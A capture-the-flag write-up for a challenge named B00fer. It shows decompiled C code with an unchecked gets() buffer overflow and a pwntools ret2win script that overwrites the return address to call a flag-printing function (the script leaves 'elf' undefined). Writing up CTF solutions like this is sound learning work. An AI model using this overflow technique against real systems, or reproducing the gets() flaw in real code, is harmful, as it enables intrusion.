# B00fer

## Description
> The Consortium sent us this file and connection info. Looks like they are taunting us.

> They are running the file at b00fer.niccgetsspooky.xyz, at port 9001. Try to get them to give up the flag.

## Attachment
### [B00fer](./B00fer)

## Solve
I decompiled the program using Ghidra and here are my results:

```c
void win() {
  char flag [40];
  FILE *fptr = fopen("flag.txt", "r");
  fread(flag, 1, 32, fptr);
  puts(flag);
  puts("Good!\n");
  exit(1);
}

int main() {
  char str [32];
  setvbuf(stdout, 0, 2, 0 );
  puts("Hi there NICC! This program is 100% and there is NO WAY you are getting our flag.\n");
  gets(str);
  return 0;
}
```

This is a very basic `ret2win` challenge.

Here's my solve script:
```py
import pwn

if pwn.args.REMOTE:
    io = pwn.remote("b00fer.niccgetsspooky.xyz", 9001)
else:
    io = pwn.process("./B00fer")

offset = 40;
payload = b'A' * offset + elf.symbols['win'].to_bytes(8, 'little')
io.sendline(payload)
print(io.recvall())
```

This printed the flag:

`NICC{Sp00ked_the_fl4g_0ut_of_m3}`
